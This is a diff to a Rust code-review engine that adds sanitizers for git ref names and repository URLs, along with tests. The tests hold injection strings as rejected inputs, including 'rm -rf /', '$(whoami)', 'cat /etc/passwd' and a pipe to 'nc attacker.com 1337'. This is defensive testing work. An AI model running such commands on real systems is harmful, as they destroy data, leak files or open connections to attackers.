@@ -8,6 +8,40 @@ use std::time::{Duration, Instant};
 use crate::diff_filter::DiffFilter;
 use crate::config::AppConfig;
 
+/// Sanitize a git ref name to prevent command injection.
+/// Only allows alphanumeric characters, hyphens, underscores, dots, and slashes.
+fn sanitize_git_ref(ref_name: &str) -> anyhow::Result<String> {
+    if ref_name.is_empty() {
+        return Err(anyhow::anyhow!("git ref name cannot be empty"));
+    }
+    if ref_name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.' || b == b'/') {
+        Ok(ref_name.to_string())
+    } else {
+        Err(anyhow::anyhow!("invalid git ref name: {}", ref_name))
+    }
+}
+
+/// Validate that a repository URL looks like a valid git remote.
+fn validate_repo_url(url: &str) -> anyhow::Result<()> {
+    if url.is_empty() {
+        return Err(anyhow::anyhow!("repo URL cannot be empty"));
+    }
+    // Allow common git URL schemes and formats
+    let valid = url.starts_with("https://")
+        || url.starts_with("http://")
+        || url.starts_with("git@")
+        || url.starts_with("git://")
+        || url.starts_with("ssh://");
+    if !valid {
+        return Err(anyhow::anyhow!("invalid repo URL scheme: {}", url));
+    }
+    // Reject URLs with shell metacharacters
+    if url.bytes().any(|b| matches!(b, b';' | b'&' | b'|' | b'$' | b'`' | b'<' | b'>' | b'(' | b')')) {
+        return Err(anyhow::anyhow!("repo URL contains forbidden characters"));
+    }
+    Ok(())
+}
+
 #[derive(Clone, Debug)]
 pub struct CommitRange {
     pub base: String,
@@ -55,6 +89,11 @@ impl ReviewEngine {
         base: &str,
         head: &str,
     ) -> anyhow::Result<String> {
+        // Validate inputs to prevent command injection
+        validate_repo_url(repo_url)?;
+        let base = sanitize_git_ref(base)?;
+        let head = sanitize_git_ref(head)?;
+
         let temp_dir = tempfile::tempdir()?;
         let repo_path = temp_dir.path();
 
@@ -62,7 +101,7 @@ impl ReviewEngine {
 
         // Initialize a bare repo and fetch both branches as local refs
         let init_output = Command::new("git")
-            .args(["init", "--bare", repo_path.to_str().unwrap()])
+            .args(["init", "--bare", repo_path.to_str().unwrap_or(".")])
             .output()?;
 
         if !init_output.status.success() {
@@ -186,6 +225,9 @@ impl ReviewEngine {
         repo_url: &str,
         commits: &[CommitRange],
     ) -> anyhow::Result<String> {
+        // Validate repo URL to prevent command injection
+        validate_repo_url(repo_url)?;
+
         if commits.is_empty() {
             return Ok(String::new());
         }
@@ -311,8 +353,45 @@ mod tests {
             }
             Err(e) => {
                 // Fetch may fail if branch doesn't exist, which is acceptable for this test
-                println!("Clone/diff failed (expected if branch missing): {}", e);
+                println!("Clone/diff failed (expected if branch missing): {e}");
             }
         }
+    }
+
+    #[test]
+    fn test_sanitize_git_ref_rejects_injection() {
+        // Valid refs should pass
+        assert!(sanitize_git_ref("main").is_ok());
+        assert!(sanitize_git_ref("feature/my-branch").is_ok());
+        assert!(sanitize_git_ref("v1.2.3").is_ok());
+        assert!(sanitize_git_ref("release_2024").is_ok());
+
+        // Injection attempts should be rejected
+        assert!(sanitize_git_ref("main; rm -rf /").is_err());
+        assert!(sanitize_git_ref("$(whoami)").is_err());
+        assert!(sanitize_git_ref("`id`").is_err());
+        assert!(sanitize_git_ref("|cat /etc/passwd").is_err());
+        assert!(sanitize_git_ref("&echo pwned").is_err());
+        assert!(sanitize_git_ref("<script>").is_err());
+
+        // Empty ref should be rejected
+        assert!(sanitize_git_ref("").is_err());
+    }
+
+    #[test]
+    fn test_validate_repo_url_rejects_injection() {
+        // Valid URLs should pass
+        assert!(validate_repo_url("https://github.com/test/repo.git").is_ok());
+        assert!(validate_repo_url("git@github.com:test/repo.git").is_ok());
+        assert!(validate_repo_url("http://localhost:8080/repo.git").is_ok());
+        assert!(validate_repo_url("git://github.com/test/repo.git").is_ok());
+        assert!(validate_repo_url("ssh://git@github.com/test/repo.git").is_ok());
+
+        // Injection attempts should be rejected
+        assert!(validate_repo_url("https://evil.com; rm -rf /").is_err());
+        assert!(validate_repo_url("https://evil.com && cat /etc/passwd").is_err());
+        assert!(validate_repo_url("https://evil.com | nc attacker.com 1337").is_err());
+        assert!(validate_repo_url("$(whoami)").is_err());
+        assert!(validate_repo_url("").is_err());
     }
 }
